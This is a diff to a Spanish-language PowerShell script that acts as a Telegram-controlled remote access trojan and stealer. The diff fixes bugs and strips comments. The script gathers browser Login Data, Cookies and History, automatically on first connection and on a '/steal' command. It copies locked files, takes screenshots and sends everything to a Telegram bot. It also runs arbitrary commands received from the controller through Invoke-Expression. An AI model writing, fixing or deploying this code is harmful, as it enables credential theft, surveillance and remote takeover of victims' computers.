@@ -45,7 +45,7 @@ function Enviar-MensajeLargo {
     for ($i = 0; $i -lt $partes; $i++) {
         $inicio = $i * $max
         $longitud = [math]::Min($max, $texto.Length - $inicio)
-        $parte = $txt.Substring($inicio, $longitud)
+        $parte = $texto.Substring($inicio, $longitud)
         Enviar-Mensaje -chatId $chatId -texto "```$parte```"
         Start-Sleep -Milliseconds 500
     }
@@ -62,7 +62,6 @@ function Enviar-DocumentoRaw {
         $file = Get-Item $rutaArchivo
         $uri = "$ApiUrl/sendDocument"
         
-        # Leer archivo como bytes y convertir a string ISO-8859-1 para multipart
         $fileBytes = [System.IO.File]::ReadAllBytes($rutaArchivo)
         $enc = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
         $fileContent = $enc.GetString($fileBytes)
@@ -145,7 +144,8 @@ function Tomar-Captura {
         $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
         $ruta = "$env:TEMP\capture_$timestamp.png"
         $bitmap.Save($ruta, [System.Drawing.Imaging.ImageFormat]::Png)
-        $graphics.Dispose(); $bitmap.Dispose()
+        $graphics.Dispose()
+        $bitmap.Dispose()
         Enviar-Foto -chatId $chatId -rutaFoto $ruta -titulo "Screenshot - $timestamp"
         Start-Sleep -Seconds 1
         Remove-Item $ruta -Force -ErrorAction SilentlyContinue
@@ -160,12 +160,10 @@ function Copiar-ArchivoBloqueado {
     try {
         if (-not (Test-Path $origen)) { return $false }
         
-        # Intentar copia normal primero
         try {
             Copy-Item $origen $destino -Force -ErrorAction Stop
             return $true
         } catch {
-            # Si falla, intentar con FileStream
             try {
                 $fs = New-Object System.IO.FileStream($origen, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                 $bytes = New-Object byte[] $fs.Length
@@ -187,9 +185,8 @@ function Copiar-ArchivoBloqueado {
 function Recolectar-DatosNavegadores {
     param ($chatId, $silencioso = $false)
     
-    if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "Recolectando datos de navegadores (modo crudo)..." }
+    if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "Recolectando datos de navegadores..." }
     
-    # Rutas específicas de navegadores
     $navegadores = @{
         'Chrome' = @{
             'Base' = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
@@ -222,7 +219,7 @@ function Recolectar-DatosNavegadores {
         Add-Content $LogPath "Procesando $nav - Base: $base"
         
         if (-not (Test-Path $base)) { 
-            Add-Content $LogPath "$nav no encontrado en $base"
+            Add-Content $LogPath "$nav no encontrado"
             continue 
         }
         
@@ -237,7 +234,6 @@ function Recolectar-DatosNavegadores {
                 continue
             }
             
-            # Determinar extensión
             if ($tipo -eq 'History' -or $tipo -eq 'Login_Data' -or $tipo -eq 'Cookies') {
                 $ext = 'db'
             } elseif ($tipo -eq 'Bookmarks') {
@@ -269,7 +265,6 @@ function Recolectar-DatosNavegadores {
         }
     }
     
-    # Enviar resumen
     $msgResumen = "Archivos enviados: $archivosEnviados`n"
     if ($errores.Count -gt 0) {
         $msgResumen += "Errores:`n" + ($errores -join "`n")
@@ -307,7 +302,6 @@ function Ejecutar-Comando {
         Add-Content $LogPath "Ejecutando comando: $comando"
         $dirActual = Obtener-DirectorioActual
         
-        # Ejecutar comando y capturar salida
         $salida = Invoke-Expression $comando 2>&1 | Out-String
         
         $resultado = "Directorio: $dirActual`n$("="*50)`n$salida"
@@ -364,7 +358,7 @@ while ($true) {
         $Global:EstadoInternet = $true
         if ($Global:PrimeraEjecucion) {
             $Global:PrimeraEjecucion = $false
-            Enviar-Mensaje -chatId $ChatId -texto "Conectado - $(Obtener-Info)`nRecolectando datos automáticamente..."
+            Enviar-Mensaje -chatId $ChatId -texto "Conectado - $(Obtener-Info)`nRecolectando datos..."
             Start-Sleep -Seconds 2
             Recolectar-DatosNavegadores -chatId $ChatId -silencioso $true
         }
@@ -389,11 +383,9 @@ while ($true) {
                     
                     Add-Content $LogPath "Comando recibido: $txt"
                     
-                    # Comando /ls o ls
                     if ($txtLower -eq 'ls' -or $txtLower -eq '/ls') {
                         Listar-Directorio -chatId $cid
                     } 
-                    # Comando /cmd <comando> - CORREGIDO
                     elseif ($txtLower -match '^cmd\s+(.+)') {
                         $c = $matches[1]
                         Ejecutar-Comando -comando $c -chatId $cid
@@ -402,7 +394,6 @@ while ($true) {
                         $c = $matches[1]
                         Ejecutar-Comando -comando $c -chatId $cid
                     } 
-                    # Comando /cd <ruta> - CORREGIDO
                     elseif ($txtLower -match '^cd\s+(.+)') {
                         $ruta = $matches[1]
                         Cambiar-Directorio -ruta $ruta -chatId $cid
@@ -411,40 +402,33 @@ while ($true) {
                         $ruta = $matches[1]
                         Cambiar-Directorio -ruta $ruta -chatId $cid
                     } 
-                    # Comando /pwd - CORREGIDO
                     elseif ($txtLower -eq '/pwd' -or $txtLower -eq 'pwd') {
                         $dir = Obtener-DirectorioActual
                         Enviar-Mensaje -chatId $cid -texto "Directorio actual: $dir"
                     } 
-                    # Comando /steal
                     elseif ($txtLower -eq 'steal' -or $txtLower -eq '/steal') {
                         Recolectar-DatosNavegadores -chatId $cid
                     } 
-                    # Comando /captura
                     elseif ($txtLower -eq 'captura' -or $txtLower -eq '/captura') {
                         Tomar-Captura -chatId $cid
                     } 
-                    # Comando /info - CORREGIDO
                     elseif ($txtLower -eq 'info' -or $txtLower -eq '/info') {
                         $info = Obtener-Info
                         $dir = Obtener-DirectorioActual
                         Enviar-Mensaje -chatId $cid -texto "$info`nDirectorio: $dir"
                     } 
-                    # Comando /help
                     elseif ($txtLower -eq 'help' -or $txtLower -eq '/help') {
-                        $ayuda = @"
+                        $ayuda = @'
 Comandos disponibles:
 /ls - Listar archivos en directorio actual
-/cmd <comando> - Ejecutar comando PowerShell
-/cd <ruta> - Cambiar de directorio
+/cmd comando - Ejecutar comando PowerShell
+/cd ruta - Cambiar de directorio
 /pwd - Mostrar directorio actual
-/steal - Recolectar datos de navegadores (archivos individuales)
+/steal - Recolectar datos de navegadores
 /captura - Tomar screenshot
 /info - Informacion del sistema
 /help - Mostrar esta ayuda
-
-Todos los comandos muestran el directorio actual.
-"@
+'@
                         Enviar-Mensaje -chatId $cid -texto $ayuda
                     }
                 }
